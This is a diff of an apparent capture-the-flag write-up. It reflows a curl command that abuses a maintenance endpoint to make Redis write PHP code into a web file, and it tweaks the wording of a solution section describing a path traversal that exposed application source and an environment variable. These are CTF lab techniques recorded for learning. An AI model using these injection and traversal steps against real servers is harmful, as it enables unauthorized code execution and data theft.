@@ -12,9 +12,7 @@ OK
 player@1be6e6576403:~$ curl "http://localhost/maintenance.php?cmd=config,set,dbfilename,index2.php"
 Running: redis-cli --raw -a '<password censored>' 'config' 'set' 'dbfilename' 'index2.php'
 OK
-player@1be6e6576403:~$ curl "http://localhost/maintenance.php?cmd=set,test,%3C%3Fphp%0A%24
-homepage%20%3D%20file_get_contents%28%27index.php%27%29%3B%0Aecho%20%24homepage%3B%0A%3F%3
-E"
+player@1be6e6576403:~$ curl "http://localhost/maintenance.php?cmd=set,test,%3C%3Fphp%0A%24homepage%20%3D%20file_get_contents%28%27index.php%27%29%3B%0Aecho%20%24homepage%3B%0A%3F%3E"
 OK
 Running: redis-cli --raw -a '<password censored>' 'set' 'test' '<?php
 $homepage = file_get_contents('\''index.php'\'');
@@ -60,7 +58,7 @@ example1The site is in maintenance modeexample2#We think there's a bug in index.
 > **Source Code Analysis** - Holly Evergreen: *“I'm sure there's a vulnerability in the source somewhere... surely Jack wouldn't leave their mark?”*  
 
 ## 8.3. Solution
-Analyzing the JS source code highlighted two interesting code lines: `img.attr('src', '/image?id=${id}'`); and `window.location = '/share?id=${res.id}'`;. Probing these URLs led to interesting results which made me have a pretty strong feeling of Path Traversal and how to exploit it. Further probing confirmed it thus I was able to obtain the source code of the application and the content of the `GREETZ` environment variable with value `JackFrostWasHere`.
+Analyzing the JS source code I highlighted two interesting code lines: `img.attr('src', '/image?id=${id}'`); and `window.location = '/share?id=${res.id}'`;. Probing these URLs led to interesting results which made me have a pretty strong feeling of Path Traversal and how to exploit it. Further probing confirmed it thus I was able to obtain the source code of the application and the content of the `GREETZ` environment variable with value `JackFrostWasHere`.
 ```bash
 thedead@dellian:~/Desktop/repos/KringleCon3-temp$ curl https://tag-generator.kringlecastle.com/image?id=test
 <h1>Something went wrong!</h1>
